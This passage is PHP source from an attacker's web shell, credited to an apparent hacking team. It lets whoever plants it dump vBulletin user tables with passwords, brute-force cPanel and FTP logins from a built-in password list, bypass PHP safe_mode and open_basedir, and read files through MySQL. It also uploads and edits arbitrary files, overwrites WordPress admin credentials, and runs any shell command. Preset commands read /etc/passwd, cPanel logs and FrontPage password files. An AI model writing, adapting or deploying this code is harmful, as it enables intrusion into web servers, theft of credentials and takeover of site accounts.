$re = mysql_query('select * from user');
echo'<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime"><th><font color=lime>ID</th><th><font color=lime>UserName</th><th><font

color=lime>E-Mail</th><th><font color=lime>PassWord</th></font></font></font></font></font>';
while ($row = mysql_fetch_array($re))
{
echo'<tr><td>' . $row['userid'] . '</td><td>' . $row['username'] . '</td><td>' . $row['email'] . '</td><td>' . $row

['password'] . '</td></tr>';
}
echo'</table>';
echo '
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime"><th>';
$count = mysql_num_rows($re);
echo 'Number of users registered is : [ ' . $count . ' ]';
echo '</th></table>';

}
if ($act == 'users'){
echo '
 <form name="myform" action="?p=vbhack&act=lst" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th><font color=yellow>:::::DATABASE CONFIG:::::</th><th><input type="submit" name="Connect" value="Connect"

/></th><tr><td><font color=yellow>Host : </td><td><input name="host" value="localhost" /></td></tr>
<tr><td><font color=yellow>User : </td><td><input name="user" value="root" /></td></tr>
<tr><td><font color=yellow>Pass : </td><td><input name="pass" value="" /></td></tr>
<tr><td><font color=yellow>Name : </td><td><input name="db" value="vb" /></td></tr>
</table>
</form>';

}
if ($act=='config')
{
echo '
<form name="myform" action="?p=vbhack&act=reconfig" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th><font color=yellow>:::::CONFIG PATH:::::</th><th><input type="submit" name="Connect" value="Read" /></th>
<tr><td>PATH : </td><td><input name="path" value="/home/User/public_html/vb/includes/config.php"

/></td></tr></table></form>';

}


echo '
<center>
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime"><td><a href="?p=vbhack&act=users"><font color=red size=5>List

Users</a></td><td><a href="?p=vbhack&act=config"><font color=red size=5>ReadConfig</a></td></tr></table>';
break;
case 'cpanelftp':
echo "</td></tr></form>
</td>
<td valign='top'>
<!-- Cpanel And FTP BruteForce Attacker -->
<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
  <center>
<textarea style='border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#00FFB2; background-color:#000000' rows='12' name='users' cols='23' >";
@system('ls /var/mail');
echo "</textarea>
<textarea  style='border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#00FFB2; background-color:#000000' rows='12' name='passwords' cols='23' >123123\n123456\n1234567\n12345678\n123456789\nabc123\n112233\n332211\nasd123\nadmin123\npassword\npass123\nwebmaster\nadminpass\webmaster\root\admin123\user\admin\admin1234\admin12345\admin123456\admin123456\admin1234567\admin123456789\sql\123\123456789\google\@\ \.\123459874\0\0123\administrateur123\server\security\hacker</textarea>
   <center> <input type='text' name='target' size='16' value='localhost'  style='border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#60c0ff; background-color:#000000'>
<input name='cracktype' value='cpanel' checked type='radio'><sy>Cpanel (2082)</sy>
<input name='cracktype' value='ftp' type='radio'><sy>Ftp (21)</sy>
<input type='submit' value='   Crack it !   ' name='BruteForceCpanelAndFTP'  style='border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#60c0ff; background-color:#000000' >
</td></tr></table></form>
</td>
<td valign='top'>
";

 if($_POST['BruteForceCpanelAndFTP'])
{
$connect_timeout=5;
set_time_limit(0);
$submit=$_REQUEST['BruteForceCpanelAndFTP'];
$users=$_REQUEST['users'];
$pass=$_REQUEST['passwords'];
$target=$_REQUEST['target'];
$cracktype=$_REQUEST['cracktype'];

if(empty($target))
{
$target = "localhost";
}

function ftp_check($host,$user,$pass,$timeout)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "ftp://$host");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 )
{
 print "</table>Error : Connection Timeout Please Check The Target Hostname .";
 exit;
}
elseif ( curl_errno($ch) == 0 )
{
print "<br><b><font color=red>[+] Cracking Success With Username <font color=lime>($user)<font color=red> and Password <font color=lime>($pass)</font>";
}
curl_close($ch);
}
function cpanel_check($host,$user,$pass,$timeout)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 )
{
print "[-] Connection Timeout Please Check The Target Hostname .";
exit;
}
elseif ( curl_errno($ch) == 0 )
{
print "<br><b><font color=red>[+] Cracking Success With Username <font color=lime>($user)<font color=red> and Password <font color=lime>($pass)</font>";
}
curl_close($ch);
}
if(isset($submit) && !empty($submit))
{
if(empty($users) && empty($pass))
{
print "<b><font color=40c0ff>[-] Please Check The Users or Password List Entry . . .";
}
if(empty($users))
{
print "<b><font color=40c0ff>[-] Please Check The Users List Entry . . .";
}
if(empty($pass))
{
print "<b><font color=40c0ff>[-] Please Check The Password List Entry . . ";
}
$userlist=explode("\n",$users);
$passlist=explode("\n",$pass);
print "</table><b><font color=40c0ff>[~]# Cracking Process Started, Please Wait ...";
foreach ($userlist as $user)
{
$pureuser = trim($user);
foreach ($passlist as $password )
{
$purepass = trim($password);
if($cracktype == "ftp")
{
ftp_check($target,$pureuser,$purepass,$connect_timeout);
}
if ($cracktype == "cpanel")
{
cpanel_check($target,$pureuser,$purepass,$connect_timeout);
}
}
}
}
}

break;


case 'bypass':
 if(!empty($_GET['file'])) $file=$_GET['file'];
else if(!empty($_POST['file'])) $file=$_POST['file'];
echo '<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr><font color=#990000 size=5><center> <br> PHP 5.2.9 | 5.2.11 safe_mode & open_basedir bypass <br><br>
</font><form name="form" method="post">
<input type="text" name="file" size="50" value="'.htmlspecialchars($file).'"><input type="submit" name="hardstylez" value="Show"></form></center>';

$level=0;
if(!file_exists("file:"))
	mkdir("file:");
chdir("file:");
$level++;
$hardstyle = explode("/", $file);
for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a]))
			mkdir($hardstyle[$a]);
		chdir($hardstyle[$a]);
		$level++;
	}
}
while($level--) chdir("..");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "file:file:///".$file);
echo '<FONT COLOR="RED"> <center><textarea rows="40" cols="120">';
if(curl_exec($ch)==FALSE)
	die(' Sorry...'.htmlspecialchars($file).' doesnt exists or you dont have permissions.');
echo ' </textarea> </center></FONT>';
break;


case 'Encypton':
echo "
<table bgcolor=yellow width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr><b><font color=red  size=3><br><p align=left><center>

Encypton With ( MD5 | Base64 | Crypt | SHA1 | MD4 | SHA256 )<br><br>
<form method=\"POST\">
<font color=\"gray\">String To Encrypt : </font><input type=\"text\" value=\"\" name=\"ENCRYPTION\">
<input type=\"submit\" value=\"Submit\"></form>";
if(!$_POST['ENCRYPTION']=='')
{
$md5 = $_POST['ENCRYPTION'];
    echo "<font size=2><font color=gray>MD5 : </font>".md5($md5)."<br>";
    echo "<font color=gray>Base64 : </font>".base64_encode($md5)."<br>";
    echo "<font color=gray>Crypt : </font>".CRYPT($md5)."<br>";
    echo "<font color=gray>SHA1 : </font>".SHA1($md5)."<br>";
    echo "<font color=gray>MD4 : </font>".hash("md4",$md5)."<br>";
    echo "<font color=gray>SHA256 : </font>".hash("sha256",$md5)."<br>";
  }
break;

case 'phpinfo':
echo '</table></head></style></html></body></table></head></style></html></body>';
phpinfo();
echo '</table></head></style></html></body></table></head></style></html></body>';
break;


case 'rename':

if(isset($_POST['fileold']))
{
if(rename($_POST['fileold'],$_POST['filenew']))
{
print "File renamed.";
}
else
{
print "Couldn't rename file.";
}

}
if(isset($_GET['file']))
{
$file = basename(htmlspecialchars($_GET['file']));
}
else
{
$file = "";
}

print "Renaming ".$file." in folder ".realpath('.').".<br>
<form action=\"".$me."?p=rename&dir=".realpath('.')."\" method=POST>
<b>Rename:<br></b><input type=text name=fileold value=\"".$file."\" size=70><br>
<b>To:<br><input type=text name=filenew value=\"\" size=10><br>
<input type=submit value=\"Rename file\">
</form>";
break;
case 'scahlf':
echo "<html>
</td></tr></table><form method='POST' enctype='multipart/form-data' >
</td></tr></table><form method='POST' enctype='multipart/form-data' >
<br>
<b>show_source  : </b><input type='text' name='show' value='' size='59' style='color: #ffffff; border: 1px dotted #ffffff; background-color: #000000'></p>
<b>highlight_file : </b><input type='text' name='high' value='' size='59' style='color: #ffffff; border: 1px dotted #ffffff; background-color: #000000'></p>
<input type='submit''  value='Read'  style='color: #ffffff; border: 1px dotted #ffffff; background-color: #000000'></form</p>
</form</p>";

if(empty($_POST['show']))
{
}
else
{
$s = $_POST['show'];
echo "<b><h1><font size='4' color='silver'>show_source</font></h1>";
$show = show_source($s);
}
if(empty($_POST['high']))
{
}
else
{
$h = $_POST['high'];
echo "<b><h1><font size='4' color='silver'>highlight_file</font></h1>";
echo "<br>";
$high = highlight_file($h);
}
break;
case 'about':
  echo '<center>
<font color="red" size="7">Dz_HaCker'Z TeaM';
   echo '<table border="1" width="460" style="border:1px dotted red;  color:#FFB200; font-family:Tahoma; font-size:8pt; background-color:#000000">
				<tr>
					<td><font color="red">KinG.Of.Pirates</font></td>
					<td><font color="#00FF00">HaCker-Fire</font></td>
					<td><font color="white">BriscO-Dz</font></td>
					<td><font color="white">Toxic-H4Ck3r</font></td>
					<td><font color="white">Dz_One</font></td>
					<td><font color="white">KeD-AnS</font></td>
<td><font color="white">Kha&MiX</font></td>
				</tr>
				<tr>
					<td><font color="red">HaCker-1420</font></td>
					<td><font color="#00FF00">nO lOv3</font></td>
					<td><font color="white">MalicPC</font></td>
					<td><font color="white">TeaM_Mosta</font></td>
					<td><font color="white">GeL-Dz</font></td>
					<td><font color="white">Dz4aLL</font></td>
					<td><font color="white">Caddy-Dz</font></td>
				</tr>
			</table>
			</font></center></font></center></font></div>
	</div>
</div>';

break;


case 'readbysql':

echo '<form method="post" dir="ltr">
			<table border="0" cellspacing="1" width="109" dir="ltr">
		   	<tr>
			<td width="312" dir="ltr"><span style="font-size: 9pt">
			<font face="Comic Sans MS"><font color="#FFFFFF">DataBase : </font>
			<font color="#FFFFFF" face="Tahoma"> <input type="text" name="dbname" size="20"></font><font color="#FFFFFF">&nbsp;
			</font></font>
			</span></td>
			<td width="245" dir="ltr"><span style="font-size: 9pt">
			<font face="Comic Sans MS" color="#FFFFFF">Username :<br>
            </font><font color="#FFFFFF" face="Comic Sans MS">
            <input type="text" name="dbuser" size="20"></font></span></td>
			<td width="117" dir="ltr"><span style="font-size: 9pt">
			<font color="#FFFFFF" face="Comic Sans MS">Password :</font><font face="Tahoma"><input type="text" name="dbpass" size="20"></font></span></td>
		    </tr>
		    <tr>
			<td width="558" valign="middle" colspan="2" dir="ltr">
			<p align="left" dir="ltr"><span style="font-size: 9pt">
			<font face="Comic Sans MS" color="#FFFFFF">Dir :</font><font face="Tahoma">
			<input type="text" name="path1" size="28" value=""></font></span></td>
			<td width="117" valign="middle" dir="ltr">
			<font face="Tahoma"><span style="font-size: 9pt">
			<input type="submit" value="Read" name="exec"></span></font></td><center>
					    </tr>


	<td width="670" valign="middle" colspan="3" dir="ltr" height="105">
	<textarea rows="17" name="result" cols="54">';

	if(!empty($_POST['dbname']) && !empty($_POST['dbuser']) && !empty($_POST['dbpass']) && !empty($_POST['path1']))
	{
	$dbname = $_POST['dbname'];
	$dbuser = $_POST['dbuser'];
	$dbpass = $_POST['dbpass'];
	$path1 = $_POST['path1'];
	if(mysql_connect( "localhost", $dbuser, $dbpass ))
	{
	$drop= "DROP TABLE $dbname.`bypass`" ;
	$query = "CREATE TABLE $dbname.`bypass` (`fileview` VARCHAR( 2048 ) NOT NULL);";
	mysql_query($drop);
	mysql_query($query);
	mysql_query("LOAD DATA LOCAL INFILE " . "'$path1'"  . " INTO TABLE " . $dbname . ".bypass");
	$result =mysql_db_query($dbname,"SELECT * FROM bypass ");
	$numrows = mysql_num_rows($result);
	while($row = mysql_fetch_array($result))   {
	echo $row[fileview] ;
    }
	}
	}
echo'</textarea></td></tr></table>';
break;


case 'upload':

 echo '</pre></form>';
if (isset($_POST['upload'])) { $savefile = getcwd()."/" . $_FILES['file']['name']['0']; move_uploaded_file($_FILES['file']['tmp_name']['0'], $savefile); $filesizename = array(" Bytes", " KB", " MB", " GB", " TB", " PB", " EB", " ZB", " YB"); $size = round($_FILES['file']['size']['0']/pow(1024, ($i = floor(log($_FILES['file']['size']['0'], 1024)))), 2) . $filesizename[$i];print "<b>Uploaded be completed !</b><br>Details:<br>Filename: <b>" . $_FILES['file']['name']['0'] . "</b>.<br>Size: <b>" . $size . "</b>.";}
echo '<br><u><b>Upload Files:</b></u><form method="POST" enctype="multipart/form-data"><input type="hidden" name="action" value="add"><input type="file" name="file[]" size="50"><br><input type="submit" value="Upload File !" name="upload"></form><hr><br>';
if (isset($_POST['upload_url'])) {$file=$_POST['upload_url_text']; $newfile=$_POST['rename']; if (!copy($file, $newfile)) {echo "failed to copy $file...\\n";}}
echo '<u><b>Upload Files From URL:</b></u><form method="POST" enctype="multipart/form-data"><input type="hidden" name="action" value="add"><input type="text" name="upload_url_text" size="50"><br>Rename to: <input type="text" name="rename" size="10" value="inj.php"><br><input type="submit" value="Upload File !" name="upload_url"></form>';


break;


  case 'edit':


 print'<body bgcolor=#000000>
<p align="center">';
if($_POST[incl] != ""){
$file = @fopen($_POST[incl],r);
$data=@fread($file,1546768);
$msr = str_replace("\\\\","\\",$_POST[incl]);
print '<form action="" method="POST"><br>
<div align="center"><font size="4" color="#008000">Path :  </font><input name="incl" type="text" style="border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#FF0033; background-color:#000000" value="'.$msr.'" align="LEFT" size="103" /> <br></form>
<form action="" method="POST"><div align="center"><input name="incle" type="hidden" value="'.$msr.'" align="LEFT" size="45" /><textarea name="kr" style="border:1px dotted #CCFF00; width: 700px; height: 450px; font-family:Tahoma; font-size:8pt; color:#CCFF00; background-color:#000000" >'.htmlspecialchars($data).'</textarea><br><input type="submit" value="Save">';
exit;
}
if($_POST[kr]){
$fl = str_replace("\'","'",$_POST[kr]);
$fl = str_replace('\"','"',$fl);
$fl = str_replace('\\\\','\\',$fl);
$d = @fopen($_POST[incle], 'w');
@fwrite($d,$fl);
@fclose($d);
if($d){
print'<font size="4" color="#008000">Saved !!</font><br>';
exit;}else{print'<font size="4" color="#008000">Cann\'t Save !!</font><br>';
exit;}}
print'<div align="center">
<form action="" method="POST">
<input name="incl" type="submit" value="'.$_GET['file'].'" align="LEFT" size="45" style="border:1px dotted #0080ff; font-family:Tahoma; font-size:8pt; color:#CCFF00; background-color:#80a0a0"/> <br>

';
exit;

break;

case 'wpps':

if(empty($_POST['pwd'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"wp-\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"wp-\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"**\" name=\"password\" type=\"password\"><br>
  <br>
Set A New username 4 Login : <INPUT name=\"admin\" size=\"15\" value=\"admin\"><br>
Set A New password 4 Login : <INPUT name=\"pwd\" size=\"15\" value=\"123456\"><br>

<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];


 @mysql_connect($localhost,$username,$password) or die(mysql_error());
 @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_email ='".$SQL."' WHERE ID = 1") or die(mysql_error());


if($a4s){
echo "<b> Success :Now Use A New User And Pass To login In The Admin Panel</b> ";
}

}
break;
}
}
else //Default page that will be shown when the page isn't found or no page is selected.
{

$files = array();
$directories = array();

if(isset($_FILES['uploadedfile']['name']))
{
$target_path = realpath('.').'/';
$target_path = $target_path . basename( $_FILES['uploadedfile']['name']);

if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
print "File:".  basename( $_FILES['uploadedfile']['name']).
" has been uploaded";
} else{
echo "File upload failed!";
}
}
print "<table border=0 width=100%><td width=15% id=s><b>Options</b></td><td id=s><b>Filename</b></td><td id=s><b>Size</b></td><td id=s><b>Permissions</b></td><td id=s>Last modified</td><tr>";
if ($handle = opendir('.'))
{
while (false !== ($file = readdir($handle)))
{
  if(is_dir($file))
  {
$directories[] = $file;
  }
  else
  {
$files[] = $file;
  }
}
asort($directories);
asort($files);
foreach($directories as $file)
{
print "<td id=d><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\"><font color='#ff40ff' size='2'>[Renm]</font></a>
<a href=\"?p=delete&file=".realpath($file)."\">[Del]</font></a>
<a href=\"?fdownload=".realpath($file)."\"><font size='2'><font color='#ffc080' size='2'>[Dwnld]</font></a>
</td><td id=d><a href=\"".$me."?dir=".realpath($file)."\">".$file."</a></td><td id=d></td><td id=d><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\"><font color=".get_color($file).">".perm($file)."</font></a></td><td id=d>".date ("Y/m/d, H:i:s", filemtime($file))."</td><tr>";

}


foreach($files as $file)
{
print "<td id=f><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\"><font color='#ff40ff' size='2'>[Renm]</font></a>
<a href=\"?p=delete&file=".realpath($file)."\">[Del]</font></a>
<a href=\"?fdownload=".realpath($file)."\"><font color='#ffc080' size='2'>[Dwnld]</font></a>
</td><td id=f><a href=\"".$me."?p=edit&dir=".realpath('.')."&file=".realpath($file)."\">".$file."</a></td><td id=f>".filesize($file)."</td><td id=f><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\"><font color=".get_color($file).">".perm($file)."</font></a></td><td id=f>".date ("Y/m/d, H:i:s", filemtime($file))."</td><tr>";


}
}
else
{
print "<u>Error!</u> Can't open <b>".realpath('.')."</b>!<br>";
}


print "</table><hr><table  border=0 width=100%><td><b>~[ Upload File  ]~</b><br><form enctype=\"multipart/form-data\" action=\"".$me."?dir=".realpath('.')."\" method=\"POST\">
<input type='hidden' name='MAX_FILE_SIZE' value='100000000' style='color: #ffffff; font-size:8pt; border: 1px dotted #ffffff; background-color: #000000' /><input size=30 style='color: #ffffff; font-size:8pt; border: 1px dotted #ffffff; background-color: #000000' name='uploadedfile' type='file'><input type='submit' value='Upload File !' name='uploadedfile' style=\"border:1px dotted #60c0ff; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000\">
</form></td><td><form action=\"".$me."\" method=GET><b>~[ Go Dir ]~<br></b><input style=\"border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000\" type=text size=40 name=dir value=\"".realpath('.')."\"><input style=\"border:1px dotted #60c0ff; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000\" type=submit value=\"  Go Dir\"></form></td>
<tr><td><form action=\"".$me."\" method=GET><b>~[ Create File, Read File ]~<br></b><input type=hidden name=dir value=\"".realpath('.')."\"><input style=\"border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000\" type=text size=40 name=file value=\"".realpath('.')."\"><input type=hidden name=p value=edit><input type=submit value=\"Create File\" style=\"border:1px dotted #60c0ff; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000\"></form>
</td><td><form action=\"".$me."\" method=GET><b>~[ Make Dir ]~<br></b><input style=\"border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000\"  type=text size=40 name=crdir value=\"".realpath('.')."\"><input type=hidden name=dir value=\"".realpath('.')."\"><input type=hidden name=p value=createdir><input type=submit value=\"Make Dir \" style=\"border:1px dotted #60c0ff; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000\"></form></td>
</table>";
echo "<table border='2'>";
print_r('
<form method="POST" action="">
<b>Command :</font></b><input size=40 name="comx1" type="text" style="border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000"><input value="Enter" type="submit" style="border:1px dotted #60c0ff; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000">
</form>
<form method="POST" action="">
<select size="1" size=60 name="comxx" style="border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">&#1585;&#1572;&#1610;&#1577; &#1575;&#1604;&#1576;&#1608;&#1585;&#1578;&#1575;&#1578; &#1575;&#1604;&#1605;&#1601;&#1578;&#1608;&#1581;&#1607; &#1576;&#1575;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585;</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
<option value="ls -lia">ls -lia</option>
<option value="cat /home/*/public_html/_vti_pvt/access.cnf">cat /home/*/public_html/_vti_pvt/access.cnf</option>
<option value="cat /home/*/public_html/_vti_pvt/service.pwd">cat /home/*/public_html/_vti_pvt/service.pwd</option>
<option value="cat /usr/local/apache/conf/httpd.conf">cat /usr/local/apache/conf/httpd.conf</option>
</select> <input type="submit" value="Enter" style="border:1px dotted #60c0ff; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000">
</form>
</pre>
');
$comn1=shell_exec($_POST[comx1]);
$comn2=shell_exec($_POST[comxx]);

if($comn2 != "") echo "<textarea cols='125' rows='29' style='border:1px dotted #CCFF00;  color:#FFB200; font-family:Tahoma; font-size:8pt; background-color:#000000'>$comn2</textarea>";

if($comn1 != "") echo "<textarea cols='125' rows='29' style='border:1px dotted #CCFF00;  color:#FFB200; font-family:Tahoma; font-size:8pt; background-color:#000000'>$comn1</textarea>";

echo "</textarea>";
echo '</h4></pre></center></table></td>';
echo '</b></center></td></tr></table>';
}
function reload()
{
header("Location: ".basename(__FILE__));
}
function get_execution_method()
{
if(function_exists('passthru')){ $m = "passthru"; }
if(function_exists('exec')){ $m = "exec"; }
if(function_exists('shell_exec')){ $m = "shell_ exec"; }
if(function_exists('system')){ $m = "system"; }
if(!isset($m)) //No method found :-|
{
$m = "Disabled";
}
return($m);
}

function execute_command($method,$command)
{
if($method == "passthru")
{
passthru($command);
}

elseif($method == "exec")
{
exec($command,$result);
foreach($result as $output)
{
print $output."<br>";
}
}

elseif($method == "shell_exec")
{
print shell_exec($command);
}

elseif($method == "system")
{
system($command);
}

}

function perm($file)
{
if(file_exists($file))
{
return substr(sprintf('%o', fileperms($file)), -4);
}
else
{
return "????";
}
}

function get_color($file)
{
if(is_writable($file)) { return "green";}
if(!is_writable($file) && is_readable($file)) { return "white";}
if(!is_writable($file) && !is_readable($file)) { return "red";}



}

function show_dirs($where)
{
if(ereg("^c:",realpath($where)))
{
$dirparts = explode('\\',realpath($where));
}
else
{
$dirparts = explode('/',realpath($where));
}



$i = 0;
$total = "";

foreach($dirparts as $part)
{
$p = 0;
$pre = "";
while($p != $i)
{
$pre .= $dirparts[$p]."/";
$p++;

}
$total .= "<a href=\"".basename(__FILE__)."?dir=".$pre.$part."\">".$part."</a>/";
$i++;
}


return "<h2>".$total."</h2><br>";

}

print $footer;
exit();
?>





<script language="JavaScript">
<!--
var x = 0
var speed = 300
var text = "[~ Dr.Zer0 - Ml7S-HaCkErS ~]"

function Blinky() {
window.status = text
setTimeout("Blinky2()", speed)
}

function Blinky2() {
window.status = " "
setTimeout("Blinky()", speed)
}
Blinky()
</script>


